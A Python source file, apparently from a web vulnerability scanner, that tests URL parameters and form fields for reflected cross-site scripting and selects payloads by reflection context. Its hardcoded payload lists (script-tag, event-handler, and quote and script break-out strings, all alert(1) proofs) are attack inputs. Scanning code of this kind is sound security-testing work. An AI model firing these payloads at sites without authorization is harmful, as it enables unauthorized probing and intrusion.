import logging
import random
import re
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum, auto
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator
from websecure.core.reporting import add_result

logger = logging.getLogger(__name__)


class XSSScanner(BaseScanner):
    """
    Robust Cross-Site Scripting (XSS) Scanner.
    Features:
    - Reflected XSS detection via canary with baseline comparison
    - Context-aware payload selection
    - WAF Evasion/Polyglot support
    - Parallel payload testing via ThreadPoolExecutor
    """

    name = "xss"
    phase = "offensive"

    MAX_WORKERS = 4        # parallel threads
    MAX_URL_PAYLOADS = 25  # cap for URL param fuzzing
    MAX_FORM_PAYLOADS = 8  # cap per form input

    def __init__(self, session=None, results: Dict = None, debug=False):
        super().__init__(session, results, debug)
        self.canary_prefix = "wsxss"

    def _gen_canary(self) -> str:
        token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{self.canary_prefix}{token}"

    def run(self, url, results: Dict = None, **kwargs):
        if results is not None:
            self.results = results

        if isinstance(url, list):
            for u in url:
                self.scan_url(u)
        else:
            self.scan_url(url)

        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            if all_forms:
                self.scan_forms(all_forms)

    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[XSS] Scanning URL params: {url}")

        # Baseline: capture page content without injection
        try:
            baseline_res = self.session.get(url, timeout=8)
            baseline_text = baseline_res.text
        except Exception:
            baseline_text = ""

        for param_name, _ in params:
            # Canary reflection check — skip if canary already in page
            canary = self._gen_canary()
            if canary in baseline_text:
                continue

            invoked = self._inject_param(url, param_name, canary)
            try:
                probe_res = self.session.get(invoked, timeout=8)
                if canary not in probe_res.text:
                    continue  # param not reflected, no point fuzzing
            except Exception:
                continue

            # Parameter reflects input — fuzz with payloads
            self._fuzz_xss_parallel(url, param_name, baseline_text)

    def _fuzz_xss_parallel(self, url: str, param_name: str, baseline_text: str):
        payloads = self.get_smart_payloads("xss", param_name)
        if not payloads:
            payloads = [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
            ]
        payloads = list(payloads) + Mutator.mutate_polyglot("alert(1)")
        if len(payloads) > self.MAX_URL_PAYLOADS:
            payloads = random.sample(payloads, self.MAX_URL_PAYLOADS)

        def probe(payload: str):
            actual = payload
            if random.random() < 0.2:
                mutated = Mutator.mutate_xss(payload)
                actual = random.choice(mutated) if mutated else payload

            invoked = self._inject_param(url, param_name, actual)
            try:
                res = self.session.get(invoked, timeout=8)
            except Exception:
                return None

            # Only flag if payload appears in response but NOT in baseline
            if actual in res.text and actual not in baseline_text:
                return ("Reflected XSS", url, param_name, actual)
            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
            futures = {exe.submit(probe, p): p for p in payloads}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self._report_vuln(*result)
                    for f in futures:
                        f.cancel()
                    return

    def _inject_param(self, url: str, param_name: str, value: str) -> str:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param_name] = value
        new_query = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    def scan_forms(self, forms: List[Dict]):
        logger.info(f"[XSS] Scanning {len(forms)} forms...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue

            skipped = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped]

            # Baseline for form
            baseline_text = ""
            try:
                base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
                if method == "POST":
                    br = self.session.post(action, data=base_data, timeout=8)
                else:
                    br = self.session.get(action, params=base_data, timeout=8)
                baseline_text = br.text
            except Exception:
                pass

            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name:
                    continue
                self._fuzz_form_param_parallel(
                    action, method, inputs, p_name, baseline_text
                )

    def _fuzz_form_param_parallel(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        p_name: str,
        baseline_text: str,
    ):
        payloads = self.get_smart_payloads("xss", p_name)
        if not payloads:
            payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
        payloads = payloads[:self.MAX_FORM_PAYLOADS]
        base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}

        def probe(payload: str):
            form_data = dict(base_data)
            form_data[p_name] = payload
            req_kw = self.prepare_injection(action, p_name, payload, method, data=form_data)
            try:
                if method == "POST":
                    res = self.session.post(req_kw.get("url", action),
                                            data=req_kw.get("data"), timeout=8)
                else:
                    res = self.session.get(req_kw.get("url", action), timeout=8)
            except Exception:
                return None

            if payload in res.text and payload not in baseline_text:
                return ("Reflected XSS (Form)", action, p_name, payload)
            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
            futures = {exe.submit(probe, p): p for p in payloads}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self._report_vuln(*result)
                    for f in futures:
                        f.cancel()
                    return

    def _report_vuln(self, title: str, url: str, param: str, payload: str):
        entry = {
            "type": title,
            "severity": "High",
            "url": url,
            "parameter": param,
            "payload": payload,
            "proof": "Payload reflected in response (not in baseline)",
        }
        self.add("offensive", entry)
        logger.warning(f"[XSS] {title} FOUND: {url} (param={param})")


def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = XSSScanner(session, results, debug)
    scanner.run(url, results=results, **kwargs)


# ===========================================================================
# MERGED FROM: websecure/core/reflection.py
# Adaptive Reflection Analyzer — context-aware XSS payload selection
# ===========================================================================
# -*- coding: utf-8 -*-
"""
Adaptive Reflection Analyzer for WebSecure (Level 3)

Bu modül, bir input'un HTTP yanıtında nereye yansıdığını (HTML Body, Attribute, Script vb.) analiz eder.
Bu sayede "context-aware" payload seçimi yapılabilir.
"""

class ReflectionType(Enum):
    NONE = auto()                   # Yansıma yok
    HTML_TEXT = auto()              # <div>INPUT</div>
    HTML_ATTR_DOUBLE = auto()       # <div class="INPUT">
    HTML_ATTR_SINGLE = auto()       # <div class='INPUT'>
    HTML_ATTR_UNQUOTED = auto()     # <div class=INPUT>
    SCRIPT_BLOCK = auto()           # <script>var x = "INPUT";</script>
    SCRIPT_QUOTED = auto()          # <script>var x = "INPUT";</script>
    COMMENT = auto()                # <!-- INPUT -->


@dataclass
class ReflectionPoints:
    canary: str
    contexts: List[ReflectionType]
    raw_response: str = ""


# =============================================================================
# REFLECTION ANALYSIS LOGIC
# =============================================================================

def analyze_reflection(response_text: str, canary: str) -> ReflectionPoints:
    """
    Verilen canary değerinin response içindeki konumlarını analiz eder.
    Basit regex-tabanlı parser kullanır (hız için).
    """
    if not response_text or canary not in response_text:
        return ReflectionPoints(canary, [ReflectionType.NONE], response_text)

    contexts = []
    
    # 1. Script Block Detection
    # Basitçe <script> tagleri arasını bulup orada var mı bakarız
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
    in_script = False
    for block in script_blocks:
        if canary in block:
            in_script = True
            # Script içinde quote durumuna bak (basit heuristik)
            # "canary" veya 'canary'
            if f'"{canary}"' in block or f"'{canary}'" in block:
                contexts.append(ReflectionType.SCRIPT_QUOTED)
            else:
                contexts.append(ReflectionType.SCRIPT_BLOCK)
            break # Genelde 1 script yansıması yeterlidr
            
    if not in_script:
        # 2. Attribute Detection
        # class="canary" gibi
        # (["'])[^"']*?canary[^"']*?\1
        
        # Double Quote
        if re.search(f'="[^"]*{canary}[^"]*"', response_text):
            contexts.append(ReflectionType.HTML_ATTR_DOUBLE)
        # Single Quote
        elif re.search(f"='[^']*{canary}[^']*'", response_text):
            contexts.append(ReflectionType.HTML_ATTR_SINGLE)
        # Unquoted (zor ama deneyelim) - <div id=canary>
        elif re.search(f'=[^"\'\\s>]*{canary}[^"\'\\s>]*', response_text):
             contexts.append(ReflectionType.HTML_ATTR_UNQUOTED)
        
        # 3. Comment Detection
        elif re.search(f'<!--.*{canary}.*-->', response_text, re.DOTALL):
            contexts.append(ReflectionType.COMMENT)
            
        # 4. Fallback: HTML Text
        else:
            contexts.append(ReflectionType.HTML_TEXT)

    return ReflectionPoints(canary, list(set(contexts)), response_text)


# =============================================================================
# PAYLOAD SELECTION
# =============================================================================

def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
    """
    Bulunan bağlama göre en etkili (Sniper) payload'ları döndürür.
    """
    if ctx == ReflectionType.HTML_TEXT:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
    elif ctx == ReflectionType.HTML_ATTR_DOUBLE:
        return [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)'
        ]
    elif ctx == ReflectionType.HTML_ATTR_SINGLE:
        return [
            "'><script>alert(1)</script>",
            "' onmouseover='alert(1)",
            "' autofocus onfocus='alert(1)"
        ]
    elif ctx == ReflectionType.SCRIPT_BLOCK:
        return [
            ";alert(1);//",
            "alert(1);",
            "</script><script>alert(1)</script>" # Break out
        ]
    elif ctx == ReflectionType.SCRIPT_QUOTED:
        return [
            "';alert(1);//",
            '";alert(1);//',
            "\\';alert(1);//" # Escape escape?
        ]
    elif ctx == ReflectionType.COMMENT:
        return [
            "--> <script>alert(1)</script>"
        ]
        
    return [] # None
